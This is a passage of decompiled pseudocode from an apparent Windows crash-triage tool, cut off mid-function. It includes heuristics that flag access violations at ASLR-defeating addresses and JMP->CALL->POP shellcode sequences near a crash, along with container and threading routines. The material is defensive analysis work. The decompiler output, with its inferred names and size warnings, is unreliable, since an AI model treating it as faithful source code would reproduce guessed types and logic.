  local_8 = 0;
  uVar9 = 0x40e374;
  bVar2 = FUN_0040c380(*(void **)((int)this + 4),param_1,&local_c,&local_8);
  if (bVar2 == false) {
LAB_0040e43e:
    uVar4 = FUN_00402ccf(&param_2);
    return uVar4 & 0xffffff00 | uVar6;
  }
  uVar11 = 0;
  iVar3 = func_0x00423a27();
  iVar10 = 0x40e388;
  func_0x00423a17();
  uVar7 = local_8 - 3;
  param_1 = (int *)0x0;
  uVar4 = extraout_EDX;
LAB_0040e396:
  iVar8 = 0;
  uVar4 = FUN_004239f6(iStackY60,uVar4,in_stack_ffffffc8,in_stack_ffffffcc,in_stack_ffffffd0,uVar9,
                       iVar10,iVar3,uVar11);
  uVar4 = uVar4 % uVar7;
  iStackY60 = extraout_ECX;
  if (param_3 != param_2) {
    do {
      uVar1 = *(undefined *)((int)param_2 + iVar8);
      iStackY60 = CONCAT31(CONCAT21(CONCAT11(uVar1,uVar1),uVar1),uVar1);
      if (*(int *)(uVar4 + (int)local_c) == iStackY60) {
        uVar6 = uVar4 + 4;
        uVar5 = 1;
        if (uVar6 < local_8 - 4) goto LAB_0040e3e5;
        goto LAB_0040e3f9;
      }
      iVar8 = iVar8 + 1;
    } while (iVar8 != (int)param_3 - (int)param_2);
  }
  goto LAB_0040e428;
  while( true ) {
    uVar6 = uVar6 + 4;
    uVar5 = uVar5 + 1;
    if (local_8 - 4 <= uVar6) break;
LAB_0040e3e5:
    if ((0x31 < uVar5) || (*(int *)(uVar6 + (int)local_c) != iStackY60)) break;
  }
LAB_0040e3f9:
  if (3 < uVar4) {
    uVar4 = uVar4 - 4;
  }
  for (; uVar4 != 0; uVar4 = uVar4 - uVar6) {
    if (0x31 < uVar5) goto LAB_0040e43c;
    if (*(int *)(uVar4 + (int)local_c) != iStackY60) break;
    uVar5 = uVar5 + 1;
    uVar6 = uVar4;
    if (4 < uVar4) {
      uVar11 = 4;
      uVar6 = 4;
    }
  }
  if (0x31 < uVar5) {
LAB_0040e43c:
    uVar6 = 1;
    goto LAB_0040e43e;
  }
LAB_0040e428:
  uVar6 = 0;
  param_1 = (int *)((int)param_1 + 1);
  if (param_1 == (int *)0x14) goto LAB_0040e43e;
  goto LAB_0040e396;
}



undefined8 __fastcall FUN_0040e451(int param_1)

{
  code *pcVar1;
  uint uVar2;
  int *piVar3;
  int iVar4;
  int extraout_EDX;
  undefined8 uVar5;
  void *pvStack100;
  uint local_60;
  uint local_5c [3];
  int local_50;
  uint local_48;
  uint local_c;
  
  local_c = DAT_00435980 ^ (uint)&pvStack100;
  local_60 = 0;
  FUN_00416e80(local_5c,0,0x4c);
  uVar2 = FUN_0040c2b1(*(void **)(param_1 + 4),&local_60);
  if (((((char)uVar2 != '\0') && (local_60 == 0xc0000005)) && (local_50 == 2)) &&
     (((0x7eefffff < local_48 && (local_48 < 0x7f000000)) || (local_48 + 0x80020000 < 0x10001)))) {
    piVar3 = (int *)FUN_0040139e();
    if (piVar3 == (int *)0x0) {
      ATL::AtlThrowImpl(-0x7fffbffb);
      pcVar1 = (code *)swi(3);
      uVar5 = (*pcVar1)();
      return uVar5;
    }
    iVar4 = (**(code **)(*piVar3 + 0xc))();
    pvStack100 = (void *)(iVar4 + 0x10);
    FUN_00408136((CSimpleStringT_char_0_ *)&pvStack100,
                 "An access violation occurred dereferencing an address commonly used to defeat ASLR.\nCrashing address: %x\n"
                );
    FUN_0040c51e(*(int *)(param_1 + 4),extraout_EDX,&pvStack100);
    FUN_00401df0((int **)((int)pvStack100 + -0x10));
  }
  uVar5 = FUN_0041a954();
  return uVar5;
}



undefined8 __fastcall FUN_0040e52b(int param_1)

{
  uint *puVar1;
  code *pcVar2;
  uint *puVar3;
  bool bVar4;
  uint uVar5;
  int *piVar6;
  int **ppiVar7;
  undefined4 *puVar8;
  int iVar9;
  uint *puVar10;
  int extraout_EDX;
  int extraout_EDX_00;
  undefined8 uVar11;
  undefined auStack132 [4];
  uint local_80;
  uint *local_7c;
  uint local_78;
  int *local_74;
  int local_70;
  uint local_6c;
  int *local_68 [2];
  uint local_60;
  uint local_5c [2];
  uint local_54;
  uint local_c;
  
  local_c = DAT_00435980 ^ (uint)auStack132;
  local_60 = 0;
  local_70 = param_1;
  FUN_00416e80(local_5c,0,0x4c);
  uVar5 = FUN_0040c2b1(*(void **)(param_1 + 4),&local_60);
  if (((char)uVar5 == '\0') ||
     (piVar6 = (int *)FUN_0040c445(*(void **)(param_1 + 4),local_54), local_74 = piVar6,
     piVar6 == (int *)0x0)) goto LAB_0040e783;
  local_54 = local_54 - (int)piVar6;
  local_78 = local_54;
  FUN_0040dcbe(*(void **)(local_70 + 4),local_68);
  ppiVar7 = (int **)FUN_0040cb5e(local_68,(int *)&local_6c,(uint *)&local_74);
  if (*ppiVar7 == local_68[0]) {
    local_80 = 0;
    local_7c = (uint *)0x0;
    bVar4 = FUN_0040c380(*(void **)(local_70 + 4),piVar6,&local_7c,&local_80);
    puVar3 = local_7c;
    if (bVar4 != false) {
      puVar10 = local_7c;
      if (0xfff < local_54) {
        puVar10 = (uint *)((int)local_7c + (local_54 - 0x1000));
      }
      local_6c = (local_80 - local_54) - 5;
      do {
        iVar9 = local_80 - 5;
        if (0xfff < local_6c) {
          iVar9 = local_54 + 0x1000;
        }
        if ((uint *)(iVar9 + (int)puVar3) <= puVar10) break;
        if (*(byte *)puVar10 == 0xeb) {
          iVar9 = *(byte *)((int)puVar10 + 1) + 2;
LAB_0040e672:
          if (iVar9 + 0x1000U < 0x2001) {
            puVar1 = (uint *)(iVar9 + (int)puVar10);
            local_7c = (uint *)(local_80 + (int)puVar3);
            local_54 = local_78;
            if ((((puVar1 <= (uint *)((int)local_7c + -5)) && (puVar3 <= puVar1)) &&
                (*(byte *)puVar1 == 0xe8)) &&
               (((*(int *)((int)puVar1 + 1) + 0x1005U < 0x2001 &&
                 (puVar1 = (uint *)((int)puVar1 + *(int *)((int)puVar1 + 1) + 5), puVar1 <= local_7c
                 )) && ((puVar3 <= puVar1 && ((*(byte *)puVar1 & 0xf8) == 0x58))))))
            goto LAB_0040e6f2;
          }
        }
        else if (*(byte *)puVar10 == 0xe9) {
          iVar9 = *(int *)((int)puVar10 + 1) + 5;
          goto LAB_0040e672;
        }
        puVar10 = (uint *)((int)puVar10 + 1);
      } while( true );
    }
  }
  goto LAB_0040e778;
LAB_0040e6f2:
  piVar6 = (int *)FUN_0040139e();
  if (piVar6 == (int *)0x0) {
    ATL::AtlThrowImpl(-0x7fffbffb);
    pcVar2 = (code *)swi(3);
    uVar11 = (*pcVar2)();
    return uVar11;
  }
  iVar9 = (**(code **)(*piVar6 + 0xc))();
  local_7c = (uint *)(iVar9 + 0x10);
  FUN_00408136((CSimpleStringT_char_0_ *)&local_7c,
               "The process crashed near a code sequence containing a Jump->Call->Pop sequence commonly used by shellcode to find the address of the instruction pointer.\nCrashing address: %x\nCrashing segment base: %x\nOffset of JMP->CALL->POP: %x\n"
              );
  iVar9 = local_70;
  FUN_0040c51e(*(int *)(local_70 + 4),extraout_EDX,&local_7c);
  puVar8 = (undefined4 *)FUN_0040139e();
  FUN_00407b45(&local_74,(int)puVar3,local_80,puVar8);
  FUN_0040c51e(*(int *)(iVar9 + 4),extraout_EDX_00,&local_74);
  FUN_00401df0((int **)(local_74 + -4));
  FUN_00401df0((int **)(local_7c + -4));
LAB_0040e778:
  FUN_0040cb35(local_68);
LAB_0040e783:
  uVar11 = FUN_0041a954();
  return uVar11;
}



void ** __fastcall FUN_0040e7a3(void **param_1,undefined4 param_2,void **param_3)

{
  void *pvVar1;
  void *pvVar2;
  undefined4 uVar3;
  void *pvVar4;
  
  *param_1 = (void *)0x0;
  param_1[1] = (void *)0x0;
  param_1[2] = (void *)0x0;
  uVar3 = FUN_00402ff7((int *)param_1,param_2,(int)param_3[1] - (int)*param_3);
  if ((char)uVar3 != '\0') {
    pvVar1 = param_3[1];
    pvVar2 = *param_3;
    pvVar4 = FID_conflict__memcpy(*param_1,*param_3,(int)pvVar1 - (int)pvVar2);
    param_1[1] = (void *)((int)pvVar4 + ((int)pvVar1 - (int)pvVar2));
  }
  return param_1;
}



undefined4 * __thiscall
FUN_0040e7e7(void *this,undefined4 *param_1,undefined4 param_2,undefined4 param_3)

{
  undefined4 *puVar1;
  undefined4 *puVar2;
  int iVar3;
  undefined4 *puVar4;
  undefined4 *puVar5;
  
                    // WARNING: Load size is inaccurate
  puVar5 = *this;
  if (*(char *)((int)param_1 + 0xd) == '\0') {
    puVar1 = FUN_0040d48a((undefined4 *)this);
    *(undefined2 *)(puVar1 + 3) = 0;
    if (puVar1 + 4 != (undefined4 *)0x0) {
      puVar2 = param_1 + 4;
      puVar4 = puVar1 + 4;
      for (iVar3 = 8; iVar3 != 0; iVar3 = iVar3 + -1) {
        *puVar4 = *puVar2;
        puVar2 = puVar2 + 1;
        puVar4 = puVar4 + 1;
      }
    }
    puVar1[1] = param_2;
    *(undefined *)(puVar1 + 3) = *(undefined *)(param_1 + 3);
    if (*(char *)((int)puVar5 + 0xd) != '\0') {
      puVar5 = puVar1;
    }
    puVar2 = FUN_0040e7e7(this,(undefined4 *)*param_1,puVar1,param_3);
    *puVar1 = puVar2;
    puVar2 = FUN_0040e7e7(this,(undefined4 *)param_1[2],puVar1,param_3);
    puVar1[2] = puVar2;
  }
  return puVar5;
}



undefined4 * __thiscall
FUN_0040e867(void *this,undefined4 *param_1,undefined4 param_2,undefined4 param_3)

{
  undefined4 *puVar1;
  undefined4 *puVar2;
  int iVar3;
  undefined4 *puVar4;
  undefined4 *puVar5;
  
                    // WARNING: Load size is inaccurate
  puVar5 = *this;
  if (*(char *)((int)param_1 + 0xd) == '\0') {
    puVar1 = FUN_0040d4bf((undefined4 *)this);
    *(undefined2 *)(puVar1 + 3) = 0;
    if (puVar1 + 4 != (undefined4 *)0x0) {
      puVar2 = param_1 + 4;
      puVar4 = puVar1 + 4;
      for (iVar3 = 5; iVar3 != 0; iVar3 = iVar3 + -1) {
        *puVar4 = *puVar2;
        puVar2 = puVar2 + 1;
        puVar4 = puVar4 + 1;
      }
    }
    puVar1[1] = param_2;
    *(undefined *)(puVar1 + 3) = *(undefined *)(param_1 + 3);
    if (*(char *)((int)puVar5 + 0xd) != '\0') {
      puVar5 = puVar1;
    }
    puVar2 = FUN_0040e867(this,(undefined4 *)*param_1,puVar1,param_3);
    *puVar1 = puVar2;
    puVar2 = FUN_0040e867(this,(undefined4 *)param_1[2],puVar1,param_3);
    puVar1[2] = puVar2;
  }
  return puVar5;
}



undefined4 * __thiscall
FUN_0040e8e7(void *this,undefined4 *param_1,undefined4 param_2,undefined4 param_3)

{
  undefined4 *puVar1;
  undefined4 *puVar2;
  int iVar3;
  undefined4 *puVar4;
  undefined4 *puVar5;
  
                    // WARNING: Load size is inaccurate
  puVar5 = *this;
  if (*(char *)((int)param_1 + 0xd) == '\0') {
    puVar1 = FUN_0040d4f4((undefined4 *)this);
    *(undefined2 *)(puVar1 + 3) = 0;
    if (puVar1 + 4 != (undefined4 *)0x0) {
      puVar2 = param_1 + 4;
      puVar4 = puVar1 + 4;
      for (iVar3 = 0xb5; iVar3 != 0; iVar3 = iVar3 + -1) {
        *puVar4 = *puVar2;
        puVar2 = puVar2 + 1;
        puVar4 = puVar4 + 1;
      }
    }
    puVar1[1] = param_2;
    *(undefined *)(puVar1 + 3) = *(undefined *)(param_1 + 3);
    if (*(char *)((int)puVar5 + 0xd) != '\0') {
      puVar5 = puVar1;
    }
    puVar2 = FUN_0040e8e7(this,(undefined4 *)*param_1,puVar1,param_3);
    *puVar1 = puVar2;
    puVar2 = FUN_0040e8e7(this,(undefined4 *)param_1[2],puVar1,param_3);
    puVar1[2] = puVar2;
  }
  return puVar5;
}



void __fastcall FUN_0040e969(undefined4 *param_1)

{
  *param_1 = &PTR_FUN_00430f68;
  if (param_1[4] != 0) {
    *(undefined4 *)(param_1[4] + 4) = param_1[3];
  }
  return;
}



undefined8 __fastcall FUN_0040e97d(int param_1)

{
  undefined8 uVar1;
  
  EnterCriticalSection((LPCRITICAL_SECTION)&DAT_00437f38);
  uVar1 = *(undefined8 *)(param_1 + 0x18);
  LeaveCriticalSection((LPCRITICAL_SECTION)&DAT_00437f38);
  return uVar1;
}



undefined4 * __thiscall FUN_0040e9a3(void *this,byte param_1)

{
  FUN_0040e9c2((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    FID_conflict__free(this);
  }
  return (undefined4 *)this;
}



void __fastcall FUN_0040e9c2(undefined4 *param_1)

{
  int iVar1;
  LPCRITICAL_SECTION lpCriticalSection;
  undefined4 *puVar2;
  PRTL_CRITICAL_SECTION_DEBUG _Dst;
  BOOL BVar3;
  undefined4 *_Memory;
  
  iVar1 = param_1[2];
  *param_1 = &PTR_FUN_00430fc0;
  if (iVar1 != 0) {
    lpCriticalSection = (LPCRITICAL_SECTION)param_1[1];
    _Memory = (undefined4 *)0x0;
    EnterCriticalSection(lpCriticalSection);
    _Dst = lpCriticalSection[1].DebugInfo;
    if (_Dst != (PRTL_CRITICAL_SECTION_DEBUG)lpCriticalSection[1].LockCount) {
      do {
        puVar2 = *(undefined4 **)_Dst;
        if (puVar2[2] == iVar1) {
          FID_conflict__memcpy
                    (_Dst,&_Dst->CriticalSection,
                     lpCriticalSection[1].LockCount - (int)&_Dst->CriticalSection & 0xfffffffc);
          lpCriticalSection[1].LockCount = lpCriticalSection[1].LockCount + -4;
          _Memory = puVar2;
          break;
        }
        _Dst = (PRTL_CRITICAL_SECTION_DEBUG)&_Dst->CriticalSection;
      } while (_Dst != (PRTL_CRITICAL_SECTION_DEBUG)lpCriticalSection[1].LockCount);
    }
    LeaveCriticalSection(lpCriticalSection);
    if (_Memory != (undefined4 *)0x0) {
      BVar3 = UnregisterWaitEx((HANDLE)_Memory[3],(HANDLE)0xffffffff);
      *_Memory = 0;
      _Memory[2] = 0;
      _Memory[3] = 0;
      _Memory[1] = 0;
      if (BVar3 == 0) {
        FUN_00407e13();
      }
    }
    FID_conflict__free(_Memory);
  }
  if (param_1[2] != 0) {
    CloseHandle((HANDLE)param_1[2]);
  }
  *param_1 = &PTR_FUN_00430704;
  return;
}



DWORD __thiscall FUN_0040ea7a(void *this,LONG param_1,HANDLE param_2,undefined param_3)

{
  HANDLE hObject;
  HANDLE pvVar1;
  DWORD DVar2;
  undefined extraout_DH;
  LPCWSTR local_20;
  _SECURITY_ATTRIBUTES local_1c [2];
  
  *(HANDLE *)((int)this + 0xc) = param_2;
  *(LONG *)((int)this + 4) = param_1;
  *(undefined *)((int)this + 0x10) = param_3;
  FUN_00401e5a(&local_20);
  FUN_004022ce((int)L"{A0C1F415-D2CE-4ddc-9B48-14E56FD55162}",
               CONCAT11(extraout_DH,*(undefined *)((int)this + 0x10)),&local_20);
  pvVar1 = CreateEventW(local_1c,1,0,local_20);
  hObject = *(HANDLE *)((int)this + 8);
  if (hObject != pvVar1) {
    if (hObject != (HANDLE)0x0) {
      CloseHandle(hObject);
    }
    *(HANDLE *)((int)this + 8) = pvVar1;
  }
  if (*(int *)((int)this + 8) == 0) {
    DVar2 = FUN_00407e13();
  }
  else {
    DVar2 = FUN_0040eb2e(*(void **)((int)this + 4),*(LPCRITICAL_SECTION *)((int)this + 8),
                         (LPCRITICAL_SECTION)this);
    if (-1 < (int)DVar2) {
      DVar2 = 0;
    }
  }
  FUN_00401e83((int *)&local_20);
  return DVar2;
}



void FUN_0040eb19(int param_1)

{
  (**(code **)(**(int **)(param_1 + 4) + 4))(*(undefined4 *)(param_1 + 8));
  return;
}



DWORD __thiscall FUN_0040eb2e(void *this,LPCRITICAL_SECTION param_1,LPCRITICAL_SECTION param_2)

{
  LPCRITICAL_SECTION Context;
  BOOL BVar1;
  
  if ((param_1 == (LPCRITICAL_SECTION)0x0) || (param_2 == (LPCRITICAL_SECTION)0x0)) {
    return 0x80070057;
  }
  Context = (LPCRITICAL_SECTION)FUN_00416f82(0x14);
  if (Context == (LPCRITICAL_SECTION)0x0) {
    Context = (LPCRITICAL_SECTION)0x0;
  }
  else {
    Context->DebugInfo = (PRTL_CRITICAL_SECTION_DEBUG)0x0;
    Context->LockCount = 0;
    Context->RecursionCount = 0;
    Context->OwningThread = (HANDLE)0x0;
    Context->LockSemaphore = (HANDLE)0x0;
  }
  Context->LockCount = (LONG)param_2;
  Context->RecursionCount = (LONG)param_1;
  Context->DebugInfo = (PRTL_CRITICAL_SECTION_DEBUG)this;
  Context->LockSemaphore = &DAT_00000008;
  EnterCriticalSection((LPCRITICAL_SECTION)this);
  BVar1 = RegisterWaitForSingleObject
                    (&Context->OwningThread,(HANDLE)Context->RecursionCount,FUN_0040eb19,Context,
                     0xffffffff,(ULONG)Context->LockSemaphore);
  if (BVar1 == 0) {
    param_2 = (LPCRITICAL_SECTION)FUN_00407e13();
    if ((int)param_2 < 0) goto LAB_0040ebd8;
  }
  else {
    param_2 = (LPCRITICAL_SECTION)0x0;
  }
  param_1 = Context;
  FUN_0040ccae((void *)((int)this + 0x18),&param_1);
  Context = (LPCRITICAL_SECTION)0x0;
LAB_0040ebd8:
  LeaveCriticalSection((LPCRITICAL_SECTION)this);
  FID_conflict__free(Context);
  return (DWORD)param_2;
}



uint FUN_0040ebf8(void *param_1,LPCWSTR *param_2)

{
  uint uVar1;
  
  uVar1 = FUN_00402858(param_1,*param_2);
  return uVar1 & 0xffffff00 | (uint)((int)uVar1 < 0);
}



void __thiscall FUN_0040ec13(void *this,int **param_1,int *param_2)

{
  int **this_00;
  int **local_10;
  int **local_c;
  int **local_8;
  
  FUN_0040efe9(this,(int *)&local_10,(LPCWSTR *)param_1);
  local_8 = local_10;
  while (local_8 != local_c) {
    FUN_00402ad4((int **)&local_8);
  }
  FUN_0040b05c(this,(int *)&local_8,local_10,local_c);
  this_00 = FUN_0040ee7e(this,param_1);
  FUN_00401b2a(this_00,param_2);
  return;
}



void __fastcall FUN_0040ec6e(int **param_1,undefined2 param_2,short *param_3,undefined4 *param_4)

{
  undefined4 *this;
  short *psVar1;
  void *pvVar2;
  short *extraout_ECX;
  short *psVar3;
  short *extraout_ECX_00;
  short *extraout_ECX_01;
  undefined4 extraout_ECX_02;
  undefined4 extraout_ECX_03;
  undefined4 uVar4;
  short *extraout_ECX_04;
  undefined2 extraout_DX;
  undefined2 uVar5;
  undefined2 extraout_DX_00;
  int iVar6;
  undefined4 extraout_EDX;
  undefined2 *puVar7;
  undefined4 extraout_EDX_00;
  short *psVar8;
  int *piVar9;
  uint uVar10;
  undefined8 uVar11;
  undefined6 uVar12;
  LPCWSTR pWVar13;
  int local_24;
  int local_20;
  int local_1c;
  int **local_18;
  short *local_14;
  int *local_10;
  undefined2 *local_c;
  uint local_8;
  
  local_8 = 0;
  local_18 = param_1;
  local_1c = FUN_0040f2ff(param_3,param_2);
  piVar9 = *param_1;
  iVar6 = 0;
  local_10 = (int *)*piVar9;
  uVar10 = 0;
  if (local_10 != piVar9) {
    iVar6 = 0;
    do {
      if (*(int *)(local_10[5] + -0xc) != 0) {
        iVar6 = iVar6 + 2 + *(int *)(local_10[4] + -0xc) + *(int *)(local_10[5] + -0xc);
      }
      FUN_00402ad4(&local_10);
      uVar10 = local_8;
      local_c = (undefined2 *)iVar6;
    } while (local_10 != piVar9);
  }
  this = param_4;
  param_4 = (undefined4 *)0x0;
  local_14 = param_3;
  this[1] = *this;
  FUN_0040eeff(this,local_1c + iVar6,(undefined2 *)&param_4);
  local_c = (undefined2 *)*this;
  local_10 = (int *)**local_18;
  psVar3 = extraout_ECX;
  uVar4 = extraout_EDX;
  psVar8 = param_3;
  piVar9 = local_10;
  if (local_10 == *local_18) {
LAB_0040ee57:
    FID_conflict__memcpy
              (local_c,local_14,(local_1c * 2 - (int)local_14) + (int)param_3 & 0xfffffffe);
    return;
  }
LAB_0040ed05:
  do {
    uVar5 = (undefined2)uVar4;
    if (*psVar8 == 0) {
LAB_0040ed32:
      param_4 = (undefined4 *)((uint)param_4 & 0xffffff);
    }
    else {
      pWVar13 = (LPCWSTR)piVar9[4];
      local_8 = uVar10 | 1;
      pvVar2 = FUN_0040f32a(&local_20,(int)psVar8);
      uVar12 = FUN_00402858(pvVar2,pWVar13);
      uVar5 = (undefined2)((uint6)uVar12 >> 0x20);
      psVar3 = extraout_ECX_00;
      if (-1 < (int)uVar12) goto LAB_0040ed32;
      param_4 = (undefined4 *)CONCAT13(1,param_4._0_3_);
    }
    if ((local_8 & 1) != 0) {
      local_8 = local_8 & 0xfffffffe;
      FUN_00401df0((int **)(local_20 + -0x10));
      psVar3 = extraout_ECX_01;
      uVar5 = extraout_DX;
    }
    if (param_4._3_1_ == '\0') {
      uVar10 = (int)psVar8 - (int)local_14 & 0xfffffffe;
      FID_conflict__memcpy(local_c,local_14,uVar10);
      puVar7 = (undefined2 *)((int)local_c + uVar10);
      local_c = puVar7;
      if (*(int *)(piVar9[5] + -0xc) != 0) {
        FID_conflict__memcpy(puVar7,(void *)piVar9[4],*(int *)((int)(void *)piVar9[4] + -0xc) * 2);
        puVar7 = local_c + *(int *)(piVar9[4] + -0xc);
        *puVar7 = 0x3d;
        puVar7 = puVar7 + 1;
        FID_conflict__memcpy(puVar7,(void *)piVar9[5],*(int *)((int)(void *)piVar9[5] + -0xc) * 2);
        iVar6 = *(int *)(piVar9[5] + -0xc);
        puVar7[iVar6] = 0;
        puVar7 = puVar7 + iVar6 + 1;
        local_c = puVar7;
      }
      do {
        uVar5 = SUB42(puVar7,0);
        if (*psVar8 == 0) {
LAB_0040ee0b:
          uVar4 = 0;
          param_4 = (undefined4 *)((uint)param_4 & 0xffffff);
        }
        else {
          pWVar13 = (LPCWSTR)piVar9[4];
          local_8 = local_8 | 2;
          pvVar2 = FUN_0040f32a(&local_24,(int)psVar8);
          uVar12 = FUN_00402858(pvVar2,pWVar13);
          uVar5 = (undefined2)((uint6)uVar12 >> 0x20);
          if ((int)uVar12 != 0) goto LAB_0040ee0b;
          param_4 = (undefined4 *)CONCAT13(1,param_4._0_3_);
          uVar4 = extraout_ECX_02;
        }
        if ((local_8 & 2) != 0) {
          local_8 = local_8 & 0xfffffffd;
          FUN_00401df0((int **)(local_24 + -0x10));
          uVar4 = extraout_ECX_03;
          uVar5 = extraout_DX_00;
        }
        if (param_4._3_1_ == '\0') goto LAB_0040ee3b;
        uVar11 = FUN_0041c12a(uVar4,uVar5);
        puVar7 = (undefined2 *)((ulonglong)uVar11 >> 0x20);
        psVar8 = psVar8 + (int)uVar11 + 1;
      } while( true );
    }
    psVar1 = psVar8;
    uVar11 = FUN_0041c12a(psVar3,uVar5);
    psVar3 = psVar1;
    uVar4 = (undefined4)((ulonglong)uVar11 >> 0x20);
    psVar8 = psVar8 + (int)uVar11 + 1;
    uVar10 = local_8;
  } while( true );
LAB_0040ee3b:
  local_14 = psVar8;
  FUN_00402ad4(&local_10);
  psVar3 = extraout_ECX_04;
  uVar4 = extraout_EDX_00;
  piVar9 = local_10;
  uVar10 = local_8;
  if (local_10 == *local_18) goto LAB_0040ee57;
  goto LAB_0040ed05;
}



int ** __thiscall FUN_0040ee7e(void *this,int **param_1)

{
  char cVar1;
  int **ppiVar2;
  uint uVar3;
  int **ppiVar4;
  void *extraout_ECX;
  void *extraout_ECX_00;
  void *pvVar5;
  int **ppiVar6;
  int **ppiVar7;
  
  ppiVar2 = param_1;
                    // WARNING: Load size is inaccurate
  ppiVar4 = (int **)(*this)[1];
  cVar1 = *(char *)((int)ppiVar4 + 0xd);
  ppiVar6 = *this;
  pvVar5 = this;
  while (cVar1 == '\0') {
    uVar3 = FUN_0040ebf8(ppiVar4 + 4,(LPCWSTR *)ppiVar2);
    if ((char)uVar3 == '\0') {
      ppiVar7 = (int **)*ppiVar4;
    }
    else {
      ppiVar7 = (int **)ppiVar4[2];
      ppiVar4 = ppiVar6;
    }
    ppiVar6 = ppiVar4;
    ppiVar4 = ppiVar7;
    pvVar5 = extraout_ECX;
    cVar1 = *(char *)((int)ppiVar7 + 0xd);
  }
                    // WARNING: Load size is inaccurate
  if ((ppiVar6 == *this) ||
     (uVar3 = FUN_0040ebf8(param_1,(LPCWSTR *)(ppiVar6 + 4)), pvVar5 = extraout_ECX_00,
     (char)uVar3 != '\0')) {
    ppiVar4 = (int **)FUN_0040f0d1(this,pvVar5,(int **)&param_1);
    FUN_0040f114(this,(int **)&param_1,ppiVar6,(LPCWSTR *)(ppiVar4 + 4),ppiVar4);
    ppiVar6 = param_1;
  }
  return ppiVar6 + 5;
}



void __thiscall FUN_0040eeff(void *this,uint param_1,undefined2 *param_2)

{
  undefined2 *puVar1;
  undefined2 *puVar2;
  uint uVar3;
  int iVar4;
  
  puVar2 = *(undefined2 **)((int)this + 4);
                    // WARNING: Load size is inaccurate
  puVar1 = *this;
  uVar3 = (int)puVar2 - (int)puVar1 >> 1;
  if (param_1 < uVar3) {
    puVar2 = puVar2 + (param_1 - uVar3);
  }
  else {
    if (param_1 <= uVar3) {
      return;
    }
    if ((param_2 < puVar2) && (puVar1 <= param_2)) {
      FUN_0040ef8a(this,param_1 - uVar3);
                    // WARNING: Load size is inaccurate
      param_2 = (undefined2 *)(*this + ((int)param_2 - (int)puVar1 >> 1) * 2);
    }
    else {
      FUN_0040ef8a(this,param_1 - uVar3);
    }
    puVar2 = *(undefined2 **)((int)this + 4);
                    // WARNING: Load size is inaccurate
    for (iVar4 = param_1 - ((int)puVar2 - *this >> 1); iVar4 != 0; iVar4 = iVar4 + -1) {
      *puVar2 = *param_2;
      puVar2 = puVar2 + 1;
    }
                    // WARNING: Load size is inaccurate
    puVar2 = (undefined2 *)
             (*(int *)((int)this + 4) + (param_1 - (*(int *)((int)this + 4) - *this >> 1)) * 2);
  }
  *(undefined2 **)((int)this + 4) = puVar2;
  return;
}



void __thiscall FUN_0040ef8a(void *this,uint param_1)

{
  uint uVar1;
  int iVar2;
  code *pcVar3;
  uint uVar4;
  int iVar5;
  
  iVar2 = *(int *)((int)this + 8);
  if ((uint)(iVar2 - *(int *)((int)this + 4) >> 1) < param_1) {
                    // WARNING: Load size is inaccurate
    iVar5 = *(int *)((int)this + 4) - *this >> 1;
    if (0x7fffffffU - iVar5 < param_1) {
      FUN_00422ea9(this,(short)iVar2);
      pcVar3 = (code *)swi(3);
      (*pcVar3)();
      return;
    }
                    // WARNING: Load size is inaccurate
    uVar1 = iVar5 + param_1;
    uVar4 = iVar2 - *this >> 1;
    if (0x7fffffff - (uVar4 >> 1) < uVar4) {
      uVar4 = 0;
    }
    else {
      uVar4 = uVar4 + (uVar4 >> 1);
    }
    if (uVar4 < uVar1) {
      uVar4 = uVar1;
    }
    FUN_0040f07d((void **)this,uVar4,uVar4);
  }
  return;
}



void __thiscall FUN_0040efe9(void *this,int *param_1,LPCWSTR *param_2)

{
  char cVar1;
  undefined4 *puVar2;
  uint uVar3;
  undefined4 *puVar4;
  undefined4 *puVar5;
  undefined4 *puVar6;
  
                    // WARNING: Load size is inaccurate
  puVar6 = *this;
  cVar1 = *(char *)((int)(undefined4 *)puVar6[1] + 0xd);
  puVar2 = puVar6;
  puVar4 = (undefined4 *)puVar6[1];
  while (cVar1 == '\0') {
    uVar3 = FUN_0040ebf8(puVar4 + 4,param_2);
    if ((char)uVar3 == '\0') {
      if ((*(char *)((int)puVar6 + 0xd) != '\0') &&
         (uVar3 = FUN_0040ebf8(param_2,(LPCWSTR *)(puVar4 + 4)), (char)uVar3 != '\0')) {
        puVar6 = puVar4;
      }
      puVar5 = (undefined4 *)*puVar4;
    }
    else {
      puVar5 = (undefined4 *)puVar4[2];
      puVar4 = puVar2;
    }
    puVar2 = puVar4;
    puVar4 = puVar5;
    cVar1 = *(char *)((int)puVar5 + 0xd);
  }
  if (*(char *)((int)puVar6 + 0xd) == '\0') {
    puVar4 = (undefined4 *)*puVar6;
  }
  else {
                    // WARNING: Load size is inaccurate
    puVar4 = *(undefined4 **)(*this + 4);
  }
  while (puVar5 = puVar4, *(char *)((int)puVar5 + 0xd) == '\0') {
    uVar3 = FUN_0040ebf8(param_2,(LPCWSTR *)(puVar5 + 4));
    if ((char)uVar3 == '\0') {
      puVar4 = (undefined4 *)puVar5[2];
    }
    else {
      puVar4 = (undefined4 *)*puVar5;
      puVar6 = puVar5;
    }
  }
  param_1[1] = (int)puVar6;
  *param_1 = (int)puVar2;
  return;
}



void __fastcall FUN_0040f07d(void **param_1,undefined4 param_2,uint param_3)

{
  void *pvVar1;
  void *pvVar2;
  void *_Dst;
  undefined8 uVar3;
  
  uVar3 = _Allocate__(param_1,param_2,param_3);
  _Dst = (void *)uVar3;
  FID_conflict__memcpy(_Dst,*param_1,(int)param_1[1] - (int)*param_1 & 0xfffffffe);
  pvVar1 = param_1[1];
  pvVar2 = *param_1;
  if (*param_1 != (void *)0x0) {
    FID_conflict__free(*param_1);
  }
  *param_1 = _Dst;
  param_1[2] = (void *)((int)_Dst + param_3 * 2);
  param_1[1] = (void *)((int)_Dst + ((int)pvVar1 - (int)pvVar2 >> 1) * 2);
  return;
}



undefined4 * __thiscall FUN_0040f0d1(void *this,undefined4 param_1,int **param_2)

{
  undefined4 *puVar1;
  int **ppiVar2;
  int *piVar3;
  
  puVar1 = FUN_00409221((undefined4 *)this);
  *(undefined2 *)(puVar1 + 3) = 0;
  if (puVar1 + 4 != (undefined4 *)0x0) {
    ppiVar2 = FUN_00401aca((int **)(**param_2 + -0x10));
    puVar1[4] = ppiVar2 + 4;
    piVar3 = (int *)FUN_0040139e();
    CSimpleStringT__(puVar1 + 5,piVar3);
  }
  return puVar1;
}



int ** __thiscall
FUN_0040f114(void *this,int **param_1,int **param_2,LPCWSTR *param_3,int **param_4)

{
  uint uVar1;
  int **ppiVar2;
  int *extraout_ECX;
  int *extraout_ECX_00;
